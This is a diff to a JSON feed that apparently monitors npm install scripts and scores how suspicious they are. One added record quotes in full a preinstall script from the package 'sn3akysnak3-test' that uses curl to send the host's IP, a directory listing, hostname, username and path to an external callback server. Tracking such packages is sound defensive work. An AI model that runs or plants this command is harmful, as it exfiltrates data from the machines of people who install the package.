@@ -1,5 +1,25 @@
 [
   {
+    "packageName": "@lynovratech/baileys",
+    "version": "1.0.11",
+    "scriptType": "postinstall",
+    "scriptContent": "node scripts/patch-rust-bridge.cjs || true",
+    "previousVersion": "1.0.10",
+    "timestamp": "2026-03-29T10:44:02.771Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
+    "packageName": "sn3akysnak3-test",
+    "version": "1.0.0",
+    "scriptType": "preinstall",
+    "scriptContent": "curl -X POST http://vbqmqfachrooukrwtgiqfmwuhpjogjle0.oast.fun/ -d \"host=$(curl ipinfo.io)&list=$(ls -la)&host=$(hostname)&user=$(whoami)&pwd=$(pwd)\"",
+    "previousVersion": null,
+    "timestamp": "2026-03-29T10:43:49.689Z",
+    "issuesend": false,
+    "suspicionScore": 10
+  },
+  {
     "packageName": "marmonitor",
     "version": "0.1.7",
     "scriptType": "postinstall",
